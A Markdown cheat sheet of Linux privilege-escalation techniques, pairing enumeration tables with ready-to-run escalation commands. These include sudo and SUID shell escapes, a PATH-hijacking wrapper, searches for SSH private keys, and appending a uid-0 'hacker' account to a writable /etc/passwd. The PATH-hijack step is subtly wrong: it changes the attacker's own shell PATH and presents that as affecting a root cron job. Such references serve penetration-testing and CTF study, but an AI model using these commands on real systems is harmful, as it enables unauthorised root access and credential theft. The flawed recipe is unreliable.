---
title: "Linux Privilege Escalation"
description: "Linux local enumeration commands, misconfigurations, and escalation methods"
---

A cheat sheet of common commands and pathways for enumerating and escalating privileges on Linux systems.

### System Enumeration

| **Command** | **Description** |
| :--- | :--- |
| `uname -a` | Print kernel version, architecture, and system information |
| `cat /etc/issue` or `cat /etc/*-release` | Identify Linux distribution / version |
| `ps aux` or `ps -ef` | List all running processes on the system |
| `ps aux | grep root` | List running processes running as root |
| `cat /proc/version` | Detailed kernel version description |
| `lscpu` | Display CPU architecture details |

### Users & Groups

| **Command** | **Description** |
| :--- | :--- |
| `whoami` | Identify current user context |
| `id` | Check current user UID, GID, and group memberships |
| `groups <user>` | Show groups a specific user belongs to |
| `cat /etc/passwd` | List all system users |
| `cat /etc/group` | List all system groups |
| `last` or `lastlog` | View history of logins on the system |
| `sudo -l` | List current user's sudo privileges (requires password or NOPASSWD) |

### Network Enumeration

| **Command** | **Description** |
| :--- | :--- |
| `ip a` or `ifconfig` | List network interfaces and IP addresses |
| `ss -tulpn` or `netstat -ano` | List open ports, active connections, and listening sockets |
| `route -n` or `ip route` | Display routing table |
| `arp -a` or `ip neigh` | Display ARP cache table (other hosts on subnet) |

### Finding Misconfigured Files & Perms

| **Command** | **Description** |
| :--- | :--- |
| `find / -perm -u=s -type f 2>/dev/null` | Find SUID executables (run with owner permissions) |
| `find / -perm -g=s -type f 2>/dev/null` | Find SGID executables |
| `getcap -r / 2>/dev/null` | List files with Linux capabilities assigned |
| `find / -writable -type f 2>/dev/null` | Find writable files for the current user |
| `find / -writable -type d 2>/dev/null` | Find writable directories for the current user |
| `find / -name "*.conf" -o -name "*.config" 2>/dev/null` | Locate configuration files |
| `find / -name "*id_rsa*" -o -name "*id_dsa*" 2>/dev/null` | Find SSH private keys |

### Cron Jobs & Tasks

| **Command** | **Description** |
| :--- | :--- |
| `cat /etc/crontab` | View system-wide cron jobs configuration |
| `ls -la /etc/cron.*` | View scripts running hourly, daily, weekly, or monthly |
| `crontab -l` | View cron jobs for the current user |
| `systemctl list-timers --all` | List active systemd timers |

### Privilege Escalation Vectors

#### 1. SUID / Sudo Exploits (GTFOBins)
If you find SUID binaries or programs allowed via `sudo -l`, look them up on **[GTFOBins](https://gtfobins.github.io/)** to find shell escape sequences.

*Example Sudo Escapes:*
```bash
# Sudo exploit for /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Sudo exploit for vim
sudo vim -c ':!/bin/sh'

# Sudo exploit for awk
sudo awk 'BEGIN {system("/bin/sh")}'
```

*Example SUID Escapes:*
```bash
# SUID exploit for env
/usr/bin/env /bin/sh -p

# SUID exploit for find
/usr/bin/find . -exec /bin/sh -p \; -quit
```

#### 2. Writable Path Exploits (`$PATH` Hijacking)
If a root-owned cron job or script calls a command without its absolute path, and you have write permissions to a directory in your `$PATH`:

```bash
# Step 1: Check your path
echo $PATH

# Step 2: Create a malicious wrapper in a writable path (e.g. /tmp)
echo "/bin/bash -p" > /tmp/tar
chmod +x /tmp/tar

# Step 3: Prepend the writable directory to the PATH variable
export PATH=/tmp:$PATH
```

#### 3. Writable /etc/passwd
If `/etc/passwd` is writable, you can add a root user directly:

```bash
# Generate password hash for password "password123"
openssl passwd -1 -salt hack password123
# Output: $1$hack$xQcsm8GZ7pB.vH3oO5k9B1

# Append new root entry to /etc/passwd
echo "hacker:\$1\$hack\$xQcsm8GZ7pB.vH3oO5k9B1:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch to the new root user
su hacker
```
